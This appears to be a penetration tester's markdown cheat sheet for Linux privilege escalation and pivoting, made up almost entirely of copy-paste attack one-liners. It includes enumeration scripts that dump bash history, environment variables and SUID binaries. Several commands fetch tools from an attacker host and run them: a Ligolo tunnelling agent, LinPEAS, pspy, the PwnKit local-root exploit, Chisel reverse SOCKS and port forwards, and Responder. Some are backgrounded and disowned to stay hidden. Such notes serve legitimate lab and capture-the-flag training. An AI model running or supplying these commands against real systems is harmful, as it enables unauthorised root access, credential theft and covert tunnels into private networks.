# Linux Privilege Escalation
#target/local #os/linux #cat/privesc

## Linux privesc enum
#sh_encode
```
echo; h(){ if [ -t 1 ]; then printf '\033[36m=== %s ===\033[0m\n\n' "$1"; else printf '=== %s ===\n\n' "$1"; fi; }; h 'ps'; ps -efww --forest; echo; h 'suspicious ps'; ps -efww --forest | grep -E '(/usr/local/|/opt/|/srv/|/home/|/tmp/|/dev/shm/|/var/tmp/)' | grep -Ev '[g]rep|/usr/local/sbin/laurel(\s|$)'; echo; h 'apache2/sites-enabled'; ls -al /etc/apache2/sites-enabled; echo; h '000-default.conf'; cat /etc/apache2/sites-enabled/000-default.conf 2>/dev/null; echo; h 'ip'; ip --color=auto --brief a; echo; ip --color=auto --brief r; echo; ip --color=auto --brief n; echo; h 'ss/netstat'; (ss -tunlp 2>/dev/null || netstat -tunlp 2>/dev/null); if [ -s "$HOME/.bash_history" ]; then echo; h '~/.bash_history'; cat "$HOME/.bash_history" 2>/dev/null; fi; echo; h '/opt'; find /opt -maxdepth 2 -printf '%y\t%p\n' 2>/dev/null | awk -F'\t' '{ t=$1; p=$2; n=split(p,a,"/"); for(i=2;i<n;i++) printf "│   "; if(n>1) printf "├── "; name=a[n]; if(t=="d") printf "\033[1;34m%s\033[0m\n", name; else print name }'; echo; h '/home'; find /home -maxdepth 3 -printf '%y\t%p\n' 2>/dev/null | awk -F'\t' '{ t=$1; p=$2; n=split(p,a,"/"); for(i=2;i<n;i++) printf "│   "; if(n>1) printf "├── "; name=a[n]; if(t=="d") printf "\033[1;34m%s\033[0m\n", name; else print name }'; echo; h 'id'; id; echo; h 'SUID'; find / -perm -4000 -ls 2>/dev/null; echo
```

## Tree
```
find <dir|.> -printf '%y\t%p\n' | awk -F'\t' '{ t=$1; p=$2; n=split(p,a,"/"); for(i=2;i<n;i++) printf "│   "; if(n>1) printf "├── "; name=a[n]; if(t=="d") printf "\033[1;34m%s\033[0m\n", name; else print name }'
```

## Container enum
#sh_encode
```
echo; h(){ if [ -t 1 ]; then printf '\033[36m=== %s ===\033[0m\n\n' "$1"; else printf '=== %s ===\n\n' "$1"; fi; }; h 'id'; id; echo; h 'ip (/proc/net/fib_trie)'; awk '$1=="|--"{i=$2}$2=="link"&&$3=="UNICAST"{p=i$1}/\/32 host LOCAL/&&i!="127.0.0.1"{split(p,a,"/");print i"/"a[2]}' /proc/net/fib_trie | sort -u; echo; h 'tcp (/proc/net/tcp)'; awk 'function h2d(s,  i,c,v){s=toupper(s);v=0;for(i=1;i<=length(s);i++){c=index("0123456789ABCDEF",substr(s,i,1))-1;v=v*16+c}return v} function ip4(h){return h2d(substr(h,7,2))"."h2d(substr(h,5,2))"."h2d(substr(h,3,2))"."h2d(substr(h,1,2))} NR>1&&$4=="0A"{split($2,a,":");print "tcp LISTEN "ip4(a[1])":"h2d(a[2])" inode="$10}' /proc/net/tcp; echo; h 'tcp6 (/proc/net/tcp6)'; awk 'function h2d(s,  i,c,v){s=toupper(s);v=0;for(i=1;i<=length(s);i++){c=index("0123456789ABCDEF",substr(s,i,1))-1;v=v*16+c}return v} NR>1&&$4=="0A"{split($2,a,":");print "tcp6 LISTEN :"h2d(a[2])" inode="$10}' /proc/net/tcp6; echo; h 'env'; env; echo; h 'mounts (non-native)'; findmnt -R / -n -l | awk '$2!="overlay" && $1!="/" && $1!~"^/(proc|sys|dev)($|/)" {print}'; echo
```

## Linux SUID enum
```
find / -perm -4000 -ls 2>/dev/null
```

## Ligolo linux agent
```
cd <working_dir>; curl http://<lhost>:<lwport>/agent -o agent; chmod 777 agent; ./agent -connect <lhost>:<ligolo_port|11601> -retry -ignore-cert &>/dev/null & disown
```

## LinPEAS & pspy (skips cloud)
```
cd <working_dir>; for file in linpeas.sh pspy64; do curl -s http://<lhost>:<lwport>/$file -o "$file"; chmod 777 "$file"; done; ./linpeas.sh -o system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex; timeout 65 ./pspy64
```

## LinPEAS (skips cloud)
```
cd <working_dir>; curl -s http://<lhost>:<lwport>/linpeas.sh -o linpeas.sh && chmod 777 linpeas.sh && ./linpeas.sh -o system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_perms_files,interesting_files,api_keys_regex
```

## pspy
```
cd <working_dir>; curl -s http://<lhost>:<lwport>/pspy64 -o pspy64 && chmod 777 pspy64 && timeout 65 ./pspy64
```

## Pwnkit
```
cd <working_dir>; curl -s http://<lhost>:<lwport>/PwnKit -o PwnKit && chmod 777 PwnKit && ./PwnKit
```

## sshuttle
```
sshuttle -r <user>@<ip> <target_cidr>
```

## Chisel reverse socks
```
cd <working_dir>; curl -s http://<lhost>:<lwport>/chisel -o chisel && chmod 777 chisel && ./chisel client <lhost>:<chisel_port|8050> R:socks &>/dev/null & disown
```

## Chisel reverse port forward
```
cd <working_dir>; curl -s http://<lhost>:<lwport>/chisel -o chisel && chmod 777 chisel && ./chisel client <lhost>:<chisel_port|8050> R:<lport>:<rhost>:<rport> &>/dev/null & disown
```

## Responder on pivot
```
cd <working_dir>; curl 10.10.14.49:8000/Responder.tar.gz -o Responder.tar.gz && tar -zxvf Responder.tar.gz && python3 Responder/Responder.py -I <iface>
```

- working_dir
/dev/shm
/tmp
